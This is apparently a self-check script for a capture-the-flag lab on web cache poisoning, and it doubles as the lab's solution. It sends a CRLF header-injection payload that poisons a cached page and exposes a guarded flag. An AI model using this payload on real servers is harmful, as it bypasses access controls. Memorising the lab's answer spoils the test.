#!/usr/bin/env bash
# w16 cache-poison :: self-verifying probe.
#
#   ./probe.sh                       # http://localhost:30016
#   ./probe.sh http://host:port
#
# Asserts the lab is genuinely solvable AND that the guard is genuinely live:
#   1. the landing page serves and advertises the lab id,
#   2. /admin/flag is a real 403 without the marker (the guard exists),
#   3. a benign request does NOT carry the marker (no accidental leak),
#   4. poison + read yields the flag,
#   5. the injection is real: the poisoning response itself carries the marker.
set -uo pipefail

BASE="${1:-http://localhost:30016}"
fail=0

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

printf '[*] target %s\n' "$BASE"

# 1. Landing page serves and is the right lab.
LANDING=$(curl -s "$BASE/")
check "landing advertises lab w16" 'name="lab" content="w16"' "$LANDING"

# 2. The internal route is genuinely guarded: no marker -> 403.
check "health reports lab w16" '"lab": "w16"' "$(curl -s "$BASE/api/health")"
check "/admin/flag is 403 without the marker" '"error": "forbidden"' "$(curl -s "$BASE/admin/flag")"

# 3. A benign request must not leak the marker in its headers.
BENIGN_HEADERS=$(curl -s -D - -o /dev/null --path-as-is "$BASE/page?name=benign$RANDOM")
if printf '%s' "$BENIGN_HEADERS" | grep -qi 'X-Internal-Cache'; then
  printf '  FAIL benign request leaked the marker header\n'
  fail=1
else
  printf '  ok   benign request does not leak the marker\n'
fi

# 4. The injection is genuine: the poisoning response carries the marker.
PAYLOAD='x%0d%0aX-Internal-Cache:%201'
POISON_HEADERS=$(curl -s -D - -o /dev/null --path-as-is "$BASE/page?name=$PAYLOAD")
check "poison response carries the injected marker" 'X-Internal-Cache: 1' "$POISON_HEADERS"

# 5. End to end: poison, then read the same URL from cache.
BODY=$(curl -s --path-as-is "$BASE/page?name=$PAYLOAD")
FLAG=$(printf '%s' "$BODY" | grep -o 'hex4b0t{[^}]*}' | head -1)
check "poisoned cache entry yields the flag" 'hex4b0t{' "$BODY"

# 6. Sanity: a fresh benign URL still does not yield the flag.
check "a fresh benign URL does not yield the flag" 'rendered preview' \
  "$(curl -s --path-as-is "$BASE/page?name=still-benign$RANDOM")"

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w16 solvable :: %s\n' "$FLAG"
else
  printf '\n[!] w16 probe FAILED\n'
fi
exit $fail
